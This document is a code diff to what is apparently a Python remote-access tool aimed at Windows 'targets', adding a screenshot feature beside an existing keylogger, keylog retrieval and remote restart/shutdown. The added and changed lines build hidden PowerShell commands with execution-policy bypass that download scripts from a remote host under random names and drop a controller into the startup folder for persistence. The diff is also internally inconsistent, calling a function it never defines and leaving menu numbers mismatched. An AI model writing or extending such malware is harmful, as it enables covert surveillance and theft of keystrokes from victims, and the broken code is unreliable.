@@ -41,10 +41,11 @@ options_menu = """
                 [0] Remote Console
                 [1] Keylogger       
                 [2] Fetch keylogs
-                [3] remote download (not done yet) 
-                [4] remote upload   (not done yet) 
-                [5] restart target
-                [6] shutdown target
+                [3] Take Screenshot
+                [4] remote download (not done yet) 
+                [5] remote upload   (not done yet) 
+                [6] restart target
+                [7] shutdown target
 
             [+] Options:
                 [-h] or [--help]     ---   help
@@ -112,8 +113,8 @@ def remote_command(ipv4,pword,command):
 
 def keylogger(ipv4,pword,temp_path,startup_path):
     print("[+] Initializing keylogger....")
-    keylogger_command  = f"powershell.exe -noP -ep bypass -windowstyle hidden -c \"iwr -uri {remote_path}/keylogger/keylogger.ps1 -outfile {temp_path}/XukhovfGQPLEcYwZ.ps1\""
-    controller_command = f"""powershell.exe -noP -ep bypass -windowstyle hidden -c "iwr -uri {remote_path}/keylogger/controller.cmd -outfile \\"{startup_path}/meuqSoQyrCUvhGjpV.cmd\\"" """
+    keylogger_command  = f"powershell powershell.exe -noP -ep bypass -windowstyle hidden -c \"iwr -uri {remote_path}/keylogger/keylogger.ps1 -outfile {temp_path}/XukhovfGQPLEcYwZ.ps1\""
+    controller_command = f"""powershell powershell.exe -noP -ep bypass -windowstyle hidden -c "iwr -uri {remote_path}/keylogger/controller.cmd -outfile \\"{startup_path}/meuqSoQyrCUvhGjpV.cmd\\"" """
     print("[+] keylogger prepared. Ready to download....")
     # print(keylogger_command,'\n\n',controller_command,'\n\n')
     print("[+] Initializing keylogger.....")
@@ -123,6 +124,12 @@ def keylogger(ipv4,pword,temp_path,startup_path):
     print("[*] keylogger installed successfully")
 
     print("\n[!] Restart target host to execute")
+
+def install_screenshot(ipv4,pword,temp_path):
+    print("[+] Downloading screenshot script...")
+    ss_script_download_command = f"powershell powershell.exe -noP -ep bypass -windowstyle hidden -c \"iwr -uri {remote_path}/ss.ps1 -outfile {temp_path}/VaxitRpwrPGyM.ps1\""
+    remote_command(ipv4,pword,ss_script_download_command)
+    print("[*] Download completed...")
 
 def update():
     return
@@ -157,6 +164,8 @@ def cli(arguments):
                     keylogger(tgt_ipv4,tgt_pword,tgt_td,tgt_sd)
                 elif option == "2":
                     remote_download(tgt_ipv4,tgt_pword,f"{tgt_td}/{tgt_uname}.log",f"/home/{username}/Downloads/")
+                elif option == "3":
+                    take_screenshot(tgt_ipv4,tgt_pword,tgt_td)
                 elif option == "5":
                     remote_command(tgt_ipv4,tgt_pword,"shutdown /r /t 0")
                 elif option == "6":
